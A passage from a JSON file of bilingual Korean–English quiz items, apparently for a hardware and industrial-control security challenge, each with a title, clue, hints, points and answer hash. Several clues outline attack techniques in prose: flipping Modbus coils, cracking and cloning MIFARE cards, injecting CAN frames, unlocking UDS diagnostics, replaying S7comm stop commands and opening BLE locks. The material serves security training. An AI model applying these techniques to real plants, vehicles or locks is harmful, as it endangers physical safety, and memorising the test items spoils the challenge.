    "tier": 2,
    "cat": "iot",
    "track": "hardware",
    "points": 90,
    "ci": true,
    "hash": "2d91dec1adadfb907ec12f4ce4fab767dad29c48383a497debd2da484d3f1065",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "알아서 열리는 문",
      "en": "The Door That Opens Itself"
    },
    "prompt": {
      "ko": "집 안의 장치들이 서로를 자동으로 찾고, 공유기에게 \"내 포트를 밖으로 열어 달라\"고 스스로 요청하게 해 주는 규격입니다. UDP 1900 으로 존재를 알리고, XML 설명서를 받아 그 안에 적힌 주소로 SOAP 명령을 던집니다. 이 규격의 네 글자 약어는?",
      "en": "The standard that lets household devices discover one another and ask the router to open a port to the outside world on their own behalf. Presence goes out on UDP 1900, a description document in XML comes back, and commands go as SOAP to the address inside it. Which four-letter abbreviation names it?"
    },
    "hints": {
      "ko": [
        "Universal Plug and Play 의 머리글자입니다.",
        "이 규격은 요청한 쪽이 누구인지 확인하지 않습니다. 게다가 이것을 인터넷 쪽 회선에까지 열어 둔 공유기가 아직 남아 있습니다."
      ],
      "en": [
        "The initials of Universal Plug and Play.",
        "It never checks who is asking — and there are still routers that answer it on the internet-facing side."
      ]
    }
  },
  {
    "id": "t2_rfid",
    "tier": 2,
    "cat": "hardware",
    "track": "hardware",
    "points": 90,
    "ci": true,
    "hash": "22e46dd1bd16cea8e78f77486ea313ac3f8af0f54c7c3f56bc737b20013c92d4",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "전지 없이 대답하는 카드",
      "en": "A Card That Answers With No Battery"
    },
    "prompt": {
      "ko": "출입증에는 전지가 없는데도 리더에 대면 대답합니다. 리더가 쏘는 전파에서 전력을 얻어 자기 식별 번호를 실어 보내기 때문입니다. 125kHz 대의 구형 계열과 13.56MHz 대의 신형 계열로 나뉘는 이 무선 식별 기술의 네 글자 약어는?",
      "en": "An access badge has no battery, yet it answers the moment you hold it to a reader: it harvests power from the reader's field and sends its identifier back. Which four-letter abbreviation names this identification technology, split between an older 125 kHz family and a newer one at 13.56 MHz?"
    },
    "hints": {
      "ko": [
        "Radio Frequency Identification 의 머리글자입니다.",
        "구형 125kHz 출입증은 번호를 그대로 흘려보낼 뿐 아무것도 확인하지 않아, 스쳐 지나며 읽어 그대로 흉내 낼 수 있습니다."
      ],
      "en": [
        "The initials of Radio Frequency Identification.",
        "An old 125 kHz badge just emits its number and checks nothing, so brushing past to read it is enough to reproduce it."
      ]
    }
  },
  {
    "id": "t2_modbus",
    "tier": 2,
    "cat": "ics",
    "track": "hardware",
    "points": 100,
    "ci": true,
    "hash": "f07ca10904fa33095440bdad6c7422510f0f275e432c9ad580e89cdb8bf87729",
    "fmt": "한 단어 / one word (6글자 / 6 chars)",
    "title": {
      "ko": "1979년에 태어난 말",
      "en": "A Language Born in 1979"
    },
    "prompt": {
      "ko": "1979년에 나온 산업용 통신 규약이 지금도 TCP 502 위에서 그대로 쓰입니다. 인증도 암호화도 없고, 요청을 보낸 쪽이 누구인지 묻지도 않아서 함수 코드 0x05 를 한 번 던지는 것만으로 출력 접점 하나를 켜고 끌 수 있습니다. 이 규약의 이름은? (여섯 글자)",
      "en": "A protocol from 1979 still runs, unchanged, over TCP 502. There is no authentication, no encryption, and no question of who is asking — one request with function code 0x05 flips a single output coil on or off. What is it called? (six characters)"
    },
    "hints": {
      "ko": [
        "제어기를 만들던 Modicon 사가 자사 장비를 잇기 위해 만든 '버스'라는 뜻입니다.",
        "0x01·0x03 은 읽기, 0x05·0x06 은 쓰기입니다. 장치 주소를 1번부터 훑어 살아 있는 슬레이브를 찾는 것부터 시작합니다."
      ],
      "en": [
        "Modicon, the controller maker, named it as a bus for tying its own gear together.",
        "0x01 and 0x03 read, 0x05 and 0x06 write. You start by sweeping unit addresses from 1 to see which slaves answer."
      ]
    }
  },
  {
    "id": "t3_sdr",
    "tier": 3,
    "cat": "hardware",
    "track": "hardware",
    "points": 105,
    "ci": true,
    "hash": "6ada229987020103f85b4b3a991a34aed52ed919d01a6c3f0ac1fd40c2093e6e",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "회로 대신 코드로 만든 무전기",
      "en": "A Radio Made Out of Code"
    },
    "prompt": {
      "ko": "복조와 변조를 전용 회로가 아니라 소프트웨어가 처리하는 무전 방식입니다. 값싼 TV 수신 동글로는 듣기만 하고, HackRF 같은 장비를 쓰면 보내기도 합니다. 덕분에 규격 문서가 없는 신호도 폭포수 화면에서 찾아내 블록을 이어 붙여 풀어 볼 수 있습니다. 이 방식의 세 글자 약어는?",
      "en": "A radio where the modulating and demodulating happen in software rather than in dedicated circuitry: a cheap TV dongle only listens, a HackRF also transmits. That is what lets you find an undocumented signal on a waterfall display and take it apart by chaining processing blocks. Which three-letter abbreviation names it?"
    },
    "hints": {
      "ko": [
        "Software Defined Radio 의 머리글자입니다.",
        "GNU Radio 같은 도구에서 블록을 이어 복조기를 만들고, 그 전에 먼저 폭포수 화면에서 신호가 어느 주파수에 앉아 있는지 찾습니다."
      ],
      "en": [
        "The initials of Software Defined Radio.",
        "You build the demodulator by wiring blocks together in something like GNU Radio — after finding, on the waterfall, where the signal actually sits."
      ]
    }
  },
  {
    "id": "t3_plc",
    "tier": 3,
    "cat": "ics",
    "track": "hardware",
    "points": 110,
    "ci": true,
    "hash": "eec1534dcbd984de8cafe9df20c2247355356d2d558c8892bec64a666835ff8f",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "공장 바닥의 작은 컴퓨터",
      "en": "The Small Computer on the Plant Floor"
    },
    "prompt": {
      "ko": "밸브와 모터에 직접 연결되어, 입력을 모두 읽고 논리를 한 번 풀고 출력을 내보내는 일을 정해진 주기로 끝없이 되풀이하는 산업용 제어기입니다. 프로그램은 전기 회로도를 닮은 사다리 모양 도면으로 그립니다. 이 제어기의 세 글자 약어는?",
      "en": "The industrial controller wired straight to valves and motors, endlessly repeating one fixed cycle: read every input, solve the logic once, drive the outputs. Its programs are drawn as ladder diagrams that look like wiring schematics. Which three-letter abbreviation names it?"
    },
    "hints": {
      "ko": [
        "Programmable Logic Controller 의 머리글자입니다.",
        "주기가 밀리초 단위라, 통신 부하를 조금만 걸어도 제어 주기가 늘어져 공정이 흔들립니다."
      ],
      "en": [
        "The initials of Programmable Logic Controller.",
        "The cycle runs in milliseconds, so even a modest flood of traffic stretches it out and the process starts to wobble."
      ]
    }
  },
  {
    "id": "t3_scada",
    "tier": 3,
    "cat": "ics",
    "track": "hardware",
    "points": 110,
    "ci": true,
    "hash": "c1be5afcba3465f3790728b2c9ae2afe0d662f343417a67edff8b53b8eafca1e",
    "fmt": "약어 / acronym (5글자 / 5 chars)",
    "title": {
      "ko": "관제실에서 내려다보는 층",
      "en": "The Layer You Watch From"
    },
    "prompt": {
      "ko": "현장에 흩어진 제어기들에서 값을 주기적으로 끌어모아 관제실 화면에 띄우고, 운전원의 명령을 다시 현장으로 내려보내는 상위 감시·제어 계층입니다. 운전원이 보는 화면 자체는 HMI 라고 따로 부릅니다. 이 계층을 가리키는 다섯 글자 약어는?",
      "en": "The supervisory layer that polls values from controllers scattered across a site, puts them on the control-room screens, and pushes the operator's commands back down. The screen the operator actually looks at has its own name, HMI. Which five-letter abbreviation names the layer? "
    },
    "hints": {
      "ko": [
        "Supervisory Control And Data Acquisition 의 머리글자입니다.",
        "이 계층은 현장 제어기 위에 얹혀 값을 모으고 명령을 배분할 뿐, 실제 밸브를 여닫는 논리는 아래층이 갖고 있습니다."
      ],
      "en": [
        "The initials of Supervisory Control And Data Acquisition.",
        "It sits above the field controllers gathering values and dispatching commands; the logic that actually moves a valve lives on the layer below."
      ]
    }
  },
  {
    "id": "t3_ota",
    "tier": 3,
    "cat": "iot",
    "track": "hardware",
    "points": 115,
    "ci": true,
    "hash": "b08bcc8b8e779d1e6476417faa59ea2424e18bbfbbf5b44e6a047e8917cc6f8a",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "공중으로 오는 갱신",
      "en": "The Update Arrives Through the Air"
    },
    "prompt": {
      "ko": "기기를 회수하지 않고 무선으로 새 펌웨어를 내려보내 갱신하는 방식입니다. 내려받은 이미지의 서명을 확인하지 않으면 공격자가 만든 이미지가 그대로 설치되고, 갱신이 실패할 때를 대비해 두 벌의 파티션을 번갈아 쓰며 이전 것으로 되돌립니다. 이 갱신 방식의 세 글자 약어는?",
      "en": "Updating firmware by pushing it to the device over the air instead of collecting the hardware. If the downloaded image's signature is never checked, whatever an attacker built gets installed as-is; and to survive a failed update the device alternates between two partition sets and rolls back to the previous one. Which three-letter abbreviation names this? "
    },
    "hints": {
      "ko": [
        "Over-The-Air 의 머리글자입니다.",
        "되돌리기 구조가 있는 기기에서는, 서명이 유효한 옛 이미지를 일부러 되돌려 이미 고친 결함을 되살리는 공격까지 막아야 합니다."
      ],
      "en": [
        "The initials of Over-The-Air.",
        "Where rollback exists you must also stop an attacker replaying an older, still-validly-signed image to bring a patched flaw back."
      ]
    }
  },
  {
    "id": "t3_mifare",
    "tier": 3,
    "cat": "hardware",
    "track": "hardware",
    "points": 115,
    "ci": true,
    "hash": "c66ccfa83cb0ac6dbf2b0210599f43227cd482608282341ca0d7e4636c795e5b",
    "fmt": "한 단어 / one word (6글자 / 6 chars)",
    "title": {
      "ko": "48비트로 지킨 카드",
      "en": "Guarded by Forty-Eight Bits"
    },
    "prompt": {
      "ko": "13.56MHz 대에서 가장 널리 깔린 비접촉 카드 계열입니다. 표준 암호 대신 48비트짜리 자체 설계 스트림 암호를 썼는데 난수가 예측 가능해서, 카드 하나만 몇 초 두면 nested·darkside 같은 공격으로 섹터 키가 줄줄이 나옵니다. Proxmark 같은 장비로 키를 얻고 그대로 복제합니다. 이 카드 계열의 이름은? (여섯 글자)",
      "en": "The most widely deployed contactless card family at 13.56 MHz. Instead of a standard cipher it used a home-grown 48-bit stream cipher whose randomness is predictable, so a few seconds with one card and the nested and darkside attacks hand you the sector keys one after another — read them off with something like a Proxmark and clone it. What is this card family called? (six characters)"
    },
    "hints": {
      "ko": [
        "NXP(옛 필립스)의 카드 상표이며, 자체 암호의 이름은 Crypto-1 입니다.",
        "기본 키가 그대로 남은 섹터가 하나만 있어도 거기서부터 나머지 섹터의 키를 차례로 끌어냅니다."
      ],
      "en": [
        "NXP's (formerly Philips's) card brand; the home-grown cipher is called Crypto-1.",
        "A single sector still holding a factory default key is enough to unravel the keys to all the others."
      ]
    }
  },
  {
    "id": "t3_eeprom",
    "tier": 3,
    "cat": "hardware",
    "track": "hardware",
    "points": 120,
    "ci": true,
    "hash": "addd6c13848263cbc7a6dacc2baca9a64ed1cfb5f78ac1a32ea2349818dcc1fd",
    "fmt": "약어 / acronym (6글자 / 6 chars)",
    "title": {
      "ko": "자외선을 쬐던 형의 후예",
      "en": "Successor to the Chip With a Window"
    },
    "prompt": {
      "ko": "설정값과 교정 데이터를 담고 전원을 내려도 잊지 않는 작은 8핀 칩입니다. 앞 세대는 지우려면 뚜껑의 창으로 자외선을 한참 쬐어야 했지만, 이것은 전기를 걸어 바이트 단위로 지우고 다시 씁니다. 이 칩을 가리키는 여섯 글자 약어는?",
      "en": "A small eight-pin chip that holds settings and calibration data and does not forget them when the power goes. Its predecessor had to be erased under ultraviolet light through a window in its lid; this one erases and rewrites electrically, a byte at a time. Which six-letter abbreviation names it?"
    },
    "hints": {
      "ko": [
        "Electrically Erasable Programmable Read-Only Memory 의 머리글자입니다.",
        "클립으로 물려 기판에 붙은 채 읽고 쓸 수 있어서, 값 한 바이트만 바꿔도 잠금이 풀리는 기기가 실제로 있습니다."
      ],
      "en": [
        "The initials of Electrically Erasable Programmable Read-Only Memory.",
        "You can clip onto it and read or write in circuit — on some devices changing a single byte is what unlocks them."
      ]
    }
  },
  {
    "id": "t3_zwave",
    "tier": 3,
    "cat": "iot",
    "track": "hardware",
    "points": 125,
    "ci": true,
    "hash": "20cdd2d895b1a52582f73dd1ffd51473e78f9300f45340abacfcb436c2053d20",
    "fmt": "한 단어 / one word (6글자 / 6 chars, - 포함 / include -)",
    "title": {
      "ko": "900MHz의 이웃",
      "en": "The Neighbour at 900 MHz"
    },
    "prompt": {
      "ko": "2.4GHz 의 혼잡을 피해 900MHz 대를 쓰는 홈 오토메이션 무선 규격입니다. 초기 보안 계층 S0 는 망 키를 넘겨줄 때 전부 0 으로 채운 임시 키로 감싸는 바람에, 그 순간만 잡으면 망 키가 그대로 드러납니다. 이 규격의 이름은? (하이픈 포함 여섯 글자)",
      "en": "A home-automation radio that dodges the crowded 2.4 GHz band by working around 900 MHz. Its first security layer, S0, wrapped the network key in a temporary key of all zeroes while handing it over — catch that moment and the network key is simply there. What is this standard called? (six characters, hyphenated)"
    },
    "hints": {
      "ko": [
        "알파벳 마지막 글자와 '파동'을 뜻하는 영단어를 하이픈으로 이은 이름입니다.",
        "S2 는 이 문제를 공개키 교환으로 고쳤지만, 옛 기기와의 호환 때문에 S0 로 낮춰 붙게 만드는 공격이 남아 있습니다."
      ],
      "en": [
        "The last letter of the alphabet, a hyphen, and the English word for a wave.",
        "S2 fixed it with a public-key exchange, but backwards compatibility still lets an attacker force a device down to S0."
      ]
    }
  },
  {
    "id": "t3_ecu",
    "tier": 3,
    "cat": "hardware",
    "track": "hardware",
    "points": 130,
    "ci": true,
    "hash": "74661500aa577db1ae2b41a4be2a01a4a29ba58d625ed00e89a633af171ceacd",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "차 한 대에 든 수십 개의 머리",
      "en": "Dozens of Brains in One Car"
    },
    "prompt": {
      "ko": "요즘 자동차에는 엔진·제동·계기판을 각각 맡은 소형 제어기가 수십 개 들어 있고, 이들은 두 가닥 버스 하나로 이어져 서로 방송하듯 값을 주고받습니다. 이 버스에는 보낸 쪽을 확인하는 장치가 없어서, 진짜보다 조금 더 자주 위조 프레임을 밀어 넣으면 계기판의 값을 덮어쓸 수 있습니다. OBD-II 커넥터로 같은 버스에 올라탈 수 있는 이 소형 제어기의 세 글자 약어는?",
      "en": "A modern car carries dozens of small controllers — one for the engine, one for braking, one for the cluster — all wired to a single two-wire bus over which they broadcast to each other. Nothing on that bus checks who sent a frame, so injecting forged ones slightly faster than the real ones overwrites what the cluster displays. Which three-letter abbreviation names these controllers, reachable over the same bus through the OBD-II connector?"
    },
    "hints": {
      "ko": [
        "Electronic Control Unit 의 머리글자입니다.",
        "진단 커넥터는 좌석 아래 손 닿는 곳에 있고, 구간을 나누는 중계 장치가 없는 차에서는 거기서 모든 제어기가 보입니다."
      ],
      "en": [
        "The initials of Electronic Control Unit.",
        "The diagnostic connector sits within reach under the dash, and on a car where nothing segments the bus every controller is visible from it."
      ]
    }
  },
  {
    "id": "t3_jffs2",
    "tier": 3,
    "cat": "hardware",
    "track": "hardware",
    "points": 130,
    "ci": true,
    "hash": "f1f2365057c1b7d76a90b3906392dc13b8473ec79d8a9886137545128ce01d41",
    "fmt": "한 단어 / one word (5글자 / 5 chars)",
    "title": {
      "ko": "덧붙여 쓰는 플래시",
      "en": "Written by Appending"
    },
    "prompt": {
      "ko": "플래시 칩 위에 바로 얹히는 쓰기 가능 파일 시스템으로, 변경을 제자리에 고쳐 쓰지 않고 로그처럼 뒤에 덧붙이며 블록을 고르게 닳게 만듭니다. 공유기의 설정 영역에서 흔히 보이고, 지금은 더 큰 플래시를 겨냥한 후속 규격에 자리를 내주고 있습니다. 이 파일 시스템의 이름은? (다섯 글자)",
      "en": "A writable filesystem that sits directly on a flash chip, never modifying in place but appending changes like a log so the blocks wear down evenly. It shows up in router settings partitions and is now giving way to a successor aimed at larger flash. What is it called? (five characters)"
    },
    "hints": {
      "ko": [
        "'저널링 플래시 파일 시스템'의 머리글자 뒤에 세대 번호가 붙은 이름입니다.",
        "지운 파일도 실제로는 뒤에 '지웠다'고 덧쓴 것뿐이라, 원본 조각이 앞쪽 블록에 그대로 남아 있는 경우가 많습니다."
      ],
      "en": [
        "The initials of 'journalling flash file system' followed by a generation number.",
        "A deleted file was only appended over with a note that it is gone, so the original often still sits in an earlier block."
      ]
    }
  },
  {
    "id": "t4_uds",
    "tier": 4,
    "cat": "hardware",
    "track": "hardware",
    "points": 130,
    "ci": true,
    "hash": "6f674393f8f10434965c60647c243c1b3beeb296365d716af1eb69cb1068956b",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "정비소가 쓰는 말",
      "en": "What the Workshop Speaks"
    },
    "prompt": {
      "ko": "ISO 14229 로 규정된 차량 진단 규약입니다. 0x10 으로 진단 세션을 바꾸고, 0x27 이 내주는 시드에 제조사 알고리즘을 적용해 키를 돌려주면 잠금이 풀리며, 그 뒤에는 0x34 부터 0x37 까지의 요청으로 제어기 메모리에 직접 써 넣을 수 있습니다. 이 규약의 세 글자 약어는?",
      "en": "The vehicle diagnostic protocol specified in ISO 14229. Request 0x10 switches the diagnostic session, 0x27 hands you a random challenge which you answer with a key computed by the maker's algorithm to unlock, and from there requests 0x34 through 0x37 write straight into the controller's memory. Which three-letter abbreviation names it?"
    },
    "hints": {
      "ko": [
        "Unified Diagnostic Services 의 머리글자입니다.",
        "시드에서 키를 만드는 알고리즘이 제어기 펌웨어 안에 그대로 들어 있어서, 이미지를 한 번 떠내면 인증을 통째로 재현할 수 있습니다."
      ],
      "en": [
        "The initials of Unified Diagnostic Services.",
        "The challenge-to-key algorithm ships inside the controller's own firmware, so dumping the image once is enough to reproduce the unlock forever."
      ]
    }
  },
  {
    "id": "t4_dnp3",
    "tier": 4,
    "cat": "ics",
    "track": "hardware",
    "points": 140,
    "ci": true,
    "hash": "72a2cb3652088fb68c90905d141fc1e71dbd6155c26b70bc392635d5a1a1312e",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "쌓아 두었다 보고한다",
      "en": "It Reports What It Kept"
    },
    "prompt": {
      "ko": "북미의 전력·수도 계통에서 널리 쓰는 원격 감시 규약입니다. 상위가 물어볼 때만 답하는 대신, 현장 장치가 사건이 일어난 시각을 붙여 차곡차곡 쌓아 두었다가 보고하기 때문에 통신이 끊겼던 구간의 기록까지 나중에 되살아납니다. IEEE 1815 로 표준화된 이 규약의 네 글자 표기는?",
      "en": "The telemetry protocol common on North American power and water systems. Rather than only answering when polled, the field device timestamps events and stores them up to report later, so the record survives an outage in the link and comes back afterwards. Which four-character designation names this protocol, standardised as IEEE 1815?"
    },
    "hints": {
      "ko": [
        "Distributed Network Protocol 의 머리글자에 버전 번호를 붙여 씁니다.",
        "인증 기능은 한참 뒤에 선택 사항으로 덧붙었을 뿐이라, 현장에는 아직 아무 확인 없이 명령을 받는 구간이 남아 있습니다."
      ],
      "en": [
        "The initials of Distributed Network Protocol with the version number attached.",
        "Authentication was bolted on much later as an option, so there are still segments in the field taking commands with no checking at all."
      ]
    }
  },
  {
    "id": "t4_gatt",
    "tier": 4,
    "cat": "iot",
    "track": "hardware",
    "points": 150,
    "ci": true,
    "hash": "2d75922b17e1706e0b58fb149213ad98e94a39f007b6f30fb5a355a4ecd9165d",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "서비스와 특성",
      "en": "Services and Characteristics"
    },
    "prompt": {
      "ko": "저전력 근거리 무선 기기의 기능은 서비스와 특성이라는 두 계층으로 드러나고, 각각은 짧은 핸들과 UUID 로 구분됩니다. 스마트 자물쇠 중에는 열림 명령을 받는 특성에 쓰기 권한만 열어 두고 사용자 확인은 전적으로 앱에 맡긴 것이 있어서, 그 핸들에 값을 직접 써 넣으면 그냥 열립니다. 이 속성 계층을 규정한 네 글자 약어는?",
      "en": "A low-energy device exposes what it can do as two layers, services and characteristics, each identified by a short handle and a UUID. Some smart locks leave the unlock characteristic writable and delegate all user checking to the phone app — write to that handle directly and the lock simply opens. Which four-letter abbreviation names this attribute layer?"
    },
    "hints": {
      "ko": [
        "Generic Attribute Profile 의 머리글자입니다.",
        "전용 탐색 도구로 특성 목록을 훑고 핸들에 값을 한 번 써 보는 것이 첫 시도이며, 읽기가 막혀 있어도 쓰기는 열려 있는 경우가 흔합니다."
      ],
      "en": [
        "The initials of Generic Attribute Profile.",
        "Enumerate the characteristics with a scanning tool and try writing to a handle — reads are often blocked while writes are left open."
      ]
    }
  },
  {
    "id": "t4_s7comm",
    "tier": 4,
    "cat": "ics",
    "track": "hardware",
    "points": 155,
    "ci": true,
    "hash": "f03038af69439668d4fb92cb04a11e69c719abbe82478b2a9ed80178076a9c26",
    "fmt": "한 단어 / one word (6글자 / 6 chars)",
    "title": {
      "ko": "102번 위의 대화",
      "en": "The Conversation Over Port 102"
    },
    "prompt": {
      "ko": "지멘스 제어기가 엔지니어링 소프트웨어와 주고받는 독자 규약으로, TCP 102(ISO-TSAP) 위에 얹혀 있습니다. 구형 판에는 인증이 아예 없어서 정지와 기동 명령을 그대로 다시 흘려보내는 것만으로 공정을 멈출 수 있었습니다. 패킷 분석기의 해독기 이름으로도 그대로 쓰이는 이 규약의 통칭은? (여섯 글자)",
      "en": "Siemens controllers speak this proprietary protocol to their engineering software, carried over TCP 102 (ISO-TSAP). Older revisions had no authentication at all, so replaying a captured stop or start command was enough to halt a process. What is the protocol commonly called — the same name a packet analyser gives its dissector? (six characters)"
    },
    "hints": {
      "ko": [
        "제어기 제품군 이름 뒤에 '통신'의 앞 네 글자를 붙여 부릅니다.",
        "규약에 재생 방지 장치가 없어서, 예전에 오간 명령을 그대로 다시 보내는 것만으로 같은 동작이 일어납니다."
      ],
      "en": [
        "The controller family's name with the first four letters of 'communication' after it.",
        "Nothing in it prevents replay, so sending an old captured command again simply performs it again."
      ]
    }
  },
  {
    "id": "t4_historian",
    "tier": 4,
    "cat": "ics",
    "track": "hardware",
    "points": 160,
    "ci": true,
    "hash": "604c00db87b22994f944ce913b66ca936bd63fad7305b4218c338eb9c9592118",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "공정의 기록 보관자",
      "en": "Keeper of the Plant Record"
    },
    "prompt": {
      "ko": "현장에서 올라오는 태그 값을 시계열로 오래 보관하고, 사무망의 보고서 도구가 그것을 조회하게 해 주는 서버입니다. 두 망 사이에 다리를 놓는 자리에 있다 보니 사무망을 통해 들어온 공격자가 현장망으로 건너가는 발판으로 자주 쓰입니다. OSIsoft PI 가 대표적인 이 서버의 이름은? (한 단어)",
      "en": "The server that keeps tag values coming up from the plant as long-term time series, so reporting tools on the business network can query them. Because it bridges the two networks, an attacker who lands on the business side routinely uses it as the stepping stone across. OSIsoft PI is the best-known example — what is this kind of server called? (one word)"
    },
    "hints": {
      "ko": [
        "역사를 기록하는 사람을 뜻하는 영단어를 그대로 씁니다.",
        "양쪽 망에 발을 걸치고 있으므로, 여기가 뚫리면 두 망을 갈라 둔 구획이 사실상 무의미해집니다."
      ],
      "en": [
        "The English word for a person who records history.",
        "It has a foot in both networks, so once it falls the separation between them stops meaning anything."
      ]
    }
  },
  {
    "id": "t4_purdue",
    "tier": 4,
    "cat": "ics",
    "track": "hardware",
    "points": 160,
    "ci": true,
    "hash": "8bee569effff17714a7478210fa1f4be983f4157da39f05f032f725ae5b1c6d3",
    "fmt": "한 단어 / one word (6글자 / 6 chars)",
    "title": {
      "ko": "레벨 0에서 5까지",
      "en": "From Level 0 to Level 5"
    },
    "prompt": {
      "ko": "센서와 구동기가 있는 맨 아래 레벨 0 부터 기업망인 레벨 5 까지 산업 제어망을 계층으로 나누고, 3 과 4 사이에 완충 구역을 두어 두 세계가 직접 만나지 않게 하라고 정리한 참조 모델입니다. 인디애나주 웨스트라피엣에 있는 대학의 이름을 그대로 딴 이 모델은? (여섯 글자)",
      "en": "The reference model that divides an industrial network into levels — sensors and actuators at level 0 up to the enterprise network at level 5 — and puts a buffer zone between 3 and 4 so the two worlds never meet directly. It carries the name of a university in West Lafayette, Indiana. What is the model called? (six characters)"
    },
    "hints": {
      "ko": [
        "웨스트라피엣에 있는 그 대학의 이름입니다.",
        "실무에서 이 모델이 무너지는 지점은 대개 완충 구역을 건너뛰고 현장망으로 바로 들어가는 원격 유지보수 회선입니다."
      ],
      "en": [
        "The name of that university in West Lafayette.",
        "In practice the model breaks at the remote-maintenance link that skips the buffer zone and reaches the plant network directly."
      ]
    }
  },
  {
    "id": "t4_stuxnet",
    "tier": 4,
    "cat": "ics",
    "track": "hardware",
    "points": 170,
    "ci": true,
    "hash": "8a3a886f05dc317741cacf05cfb87c2439e43adb83e0df72bfb240f96cf3f51c",
    "fmt": "한 단어 / one word (7글자 / 7 chars)",
    "title": {
      "ko": "원심분리기를 겨눈 코드",
      "en": "The Code That Aimed at Centrifuges"
    },
    "prompt": {
      "ko": "2010년에 발견된 웜입니다. 윈도우 제로데이 네 개와 훔친 서명으로 퍼졌지만, 특정 제조사의 주파수 변환기가 붙은 제어기를 만났을 때만 깨어나 회전 속도를 몰래 흔들었고, 그동안 관제 화면에는 미리 녹음해 둔 정상값을 되돌려 주었습니다. 이 웜의 이름은? (일곱 글자)",
      "en": "The worm found in 2010. It spread with four Windows zero-days and stolen signing certificates, but only woke up on controllers driving frequency converters from particular makers, where it quietly varied the rotor speed while replaying previously recorded normal values to the monitoring screens. What is it called? (seven characters)"
    },
    "hints": {
      "ko": [
        "코드 안에 있던 두 문자열 조각(파일 이름의 일부와 커널 드라이버 이름의 일부)을 이어 붙여 붙인 이름입니다.",
        "USB 로 옮겨 다니며 바로 가기 파일 처리의 결함으로 실행됐기 때문에, 망을 물리적으로 갈라 둔 것만으로는 막지 못했습니다."
      ],
      "en": [
        "Named by joining two fragments found inside the code itself — part of a filename and part of a kernel driver name.",
        "It travelled on USB and ran through a flaw in shortcut-file handling, so physically separating the network was not enough to stop it."
      ]
    }
  },
  {
    "id": "t4_openocd",
    "tier": 4,
    "cat": "hardware",
    "track": "hardware",
    "points": 180,
    "ci": true,
    "hash": "9d2d46d712063d6b3ac8b70889c01cb5d55fa67c7ca5271465538b259927382a",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "3333번과 4444번",
      "en": "3333 and 4444"
    },
    "prompt": {
      "ko": "디버그 어댑터용 설정 파일과 대상 칩용 설정 파일을 각각 `-f` 로 하나씩 물려 실행하면, 4444번에는 텔넷 콘솔을 3333번에는 디버거가 붙을 자리를 열어 주는 온칩 디버깅 도구는? 콘솔에서 코어를 세운 뒤 `dump_image` 로 내장 플래시를 통째로 떠낼 수 있습니다. (한 단어)",
      "en": "Which on-chip debugging tool, started with one `-f` for the debug adapter's configuration and another for the target chip's, opens a telnet console on 4444 and a port on 3333 where a debugger can connect? Halt the core from that console and `dump_image` lifts the internal flash out whole. (one word)"
    },
    "hints": {
      "ko": [
        "'열린(open)'에 온칩 디버거(On-Chip Debugger)의 머리글자를 이어 붙인 이름입니다.",
        "설정 파일 두 개를 주는 것이 시작이고, 대상 파일이 맞지 않으면 코어를 아예 인식하지 못합니다. 읽기 보호가 걸린 칩은 여기서 막힙니다."
      ],
      "en": [
        "'open' joined to the initials of On-Chip Debugger.",
        "Two configuration files is where you start; with the wrong target file it never recognises the core at all — and a read-protected chip stops you here."
      ]
    }
  },
  {
    "id": "t4_flashrom",
    "tier": 4,
    "cat": "hardware",
    "track": "hardware",
    "points": 190,
    "ci": true,
    "hash": "70df835909790827312c474bdeae830a159ba6a0ffd5eed62a0b88749b9ced24",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "칩을 통째로 읽고 되쓴다",
      "en": "Read the Chip, Write It Back"
    },
    "prompt": {
      "ko": "직렬 플래시 칩을 CH341A 나 Bus Pirate 같은 값싼 프로그래머에 물려 `-r` 로 통째로 읽어 내고, 고친 이미지를 `-w` 로 되써 넣는 도구는? 어떤 어댑터를 쓸지는 `--programmer` 로 지정합니다. (한 단어)",
      "en": "Which tool reads a serial flash chip out whole with `-r` through a cheap programmer such as a CH341A or a Bus Pirate, and writes a modified image back with `-w`, choosing the adapter with `--programmer`? (one word)"
    },
    "hints": {
      "ko": [
        "플래시와 롬, 두 낱말을 그대로 이어 붙인 이름입니다.",
        "되쓰기 전에 두 번 읽어 같은 값이 나오는지 확인하고 원본을 따로 보관하십시오. 잘못 쓰면 기기가 다시 깨어나지 않습니다."
      ],
      "en": [
        "Two words joined as they are: flash and ROM.",
        "Read twice and compare before writing, and keep the original safe — a bad write leaves a device that never comes back up."
      ]
    }
  },
  {
    "id": "t4_secureboot",
    "tier": 4,
    "cat": "hardware",
    "track": "hardware",
    "points": 200,
    "ci": true,
    "hash": "c6cf0b83f25bc0ffbfce01013a7faba0b00a0a5623acf1f029700a9327e23530",
    "fmt": "두 단어 / two words (11글자 / 11 chars)",
    "title": {
      "ko": "퓨즈에 새긴 신뢰",
      "en": "Trust Burned Into a Fuse"
    },
    "prompt": {
      "ko": "전원이 들어오면 칩 안에 구워져 바꿀 수 없는 1차 코드가 먼저 돌면서 다음 단계의 서명을 확인하고, 통과한 그 단계가 다시 다음 단계를 확인하는 사슬이 이어집니다. 사슬의 뿌리가 되는 공개키의 해시는 한 번만 쓸 수 있는 퓨즈에 구워 되돌릴 수 없게 만듭니다. 이 구조를 부르는 두 단어는? (공백 포함 열한 글자)",
      "en": "At power-up, immutable first-stage code inside the chip verifies the signature on the next stage, and that stage in turn verifies the one after it, on down the chain. The hash of the public key at the root of the chain is burned into one-time fuses so it can never be taken back. What two words name this arrangement? (eleven characters including the space)"
    },
    "hints": {
      "ko": [
        "'안전한'을 뜻하는 형용사와 부팅을 뜻하는 명사, 두 낱말을 띄어 씁니다.",
        "퓨즈를 굽지 않은 채 출고된 기기에서는 사슬의 뿌리가 비어 있어서, 자기 키로 서명한 이미지를 정품처럼 통과시킬 수 있습니다."
      ],
      "en": [
        "The adjective for 'safe' and the noun for starting a machine up, as two separate words.",
